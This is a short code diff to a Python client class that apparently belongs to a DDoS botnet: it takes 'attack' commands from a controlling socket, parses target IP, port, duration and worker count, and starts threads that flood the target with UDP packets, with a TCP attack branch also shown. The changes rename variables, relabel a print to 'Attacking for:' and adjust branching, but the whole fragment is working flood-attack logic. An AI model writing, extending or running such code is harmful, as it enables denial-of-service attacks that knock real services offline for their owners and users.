@@ -76,7 +76,7 @@ class Client():
 				s.sendto(bytes, (host,int(port)))
 				
 			s.close()
-			print("run time {}".format(time()-t1))
+			print("Attacking for: {}".format(time()-t1))
 		for n in range(int(args[4])):
 			Thread(target = dos,args=[*args]).start()
 		sleep(int(args[3]))
@@ -93,8 +93,8 @@ class Client():
 					data=data.replace("attack ","").split()
 					print('UDP ATTACK STARTED')
 					try:
-						proto, ip, port, sec, workers = data
-						data = proto, ip, int(port), int(sec), int(workers)
+						proto, attackip, port, sec, workers = data
+						data = proto, attackip, int(port), int(sec), int(workers)
 						self.sock.send("FINISHED UDP ATTACK".encode("ascii"))
 					except Exception as e:
 						print(e)
@@ -103,7 +103,7 @@ class Client():
 					print('UDP ATTACK FINISHED')
 					self.run=True
 					Thread(target = self.__ddos,args=data).start()
-				if "tcp" in data:
+				elif "tcp" in data:
 					print('TCP ATTACK STARTED')
 					print()
 					print()
